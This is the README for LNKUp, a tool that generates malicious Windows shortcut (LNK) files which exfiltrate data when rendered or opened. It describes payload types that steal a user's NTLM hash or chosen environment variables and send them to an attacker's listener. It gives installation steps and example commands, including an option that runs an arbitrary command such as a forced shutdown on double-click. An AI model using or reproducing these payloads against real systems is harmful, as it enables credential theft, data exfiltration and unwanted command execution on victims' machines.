# LNKUp
LNK Data exfiltration payload generator
---
This tool will allow you to generate LNK payloads. Upon rendering or being run, they will exfiltrate data.   

## Info
**I am not responsible for any actions you take with this tool!**   
You can contact me with any questions by opening an issue, or via my Twitter, [@Plazmaz](https://www.twitter.com/Plazmaz).

## Known gotchas
* This tool will not work on OSX or Linux machines. It is specifically designed to target windows.
* There may be issues with icon caching in some situations. If your payload doesn't execute after the first time, try regenerating it.
* You will need to run a responder or [metasploit module](https://www.rapid7.com/db/modules/auxiliary/server/capture/smb) server to capture NTLM hashes.
* To capture environment variables, you'll need to run a webserver like apache, nginx, or even just [this](https://gist.github.com/Plazmaz/cafd0bd3a3a4471446cc8fe6e4f0c036)

## Installation
Install requirements using   
`pip install -r requirements.txt`


## Usage

#### Payload types:
* NTLM
	* Steals the user's NTLM hash when rendered.
	* Needs listener server such as this [metasploit module](https://www.rapid7.com/db/modules/auxiliary/server/capture/smb)
	* More on NTLM hashes leaking: [https://dylankatz.com/NTLM-Hashes-Microsoft's-Ancient-Design-Flaw/](https://dylankatz.com/NTLM-Hashes-Microsoft's-Ancient-Design-Flaw/?utm_source=github_lnkup)
	* Example usage:   
	 `lnkup.py --host localhost --type ntlm --output out.lnk`
* Environment
	* Steals the user's environment variables.
	* Examples: %PATH%, %USERNAME%, etc
	* Requires variables to be set using --vars
	* Example usage:   
	 `lnkup.py --host localhost --type environment --vars PATH USERNAME JAVA_HOME --output out.lnk`
#### Extra:
* Use `--execute` to specify a command to run when the shortcut is double clicked
	* Example:   
	  `lnkup.py --host localhost --type ntlm --output out.lnk --execute "shutdown /s"`
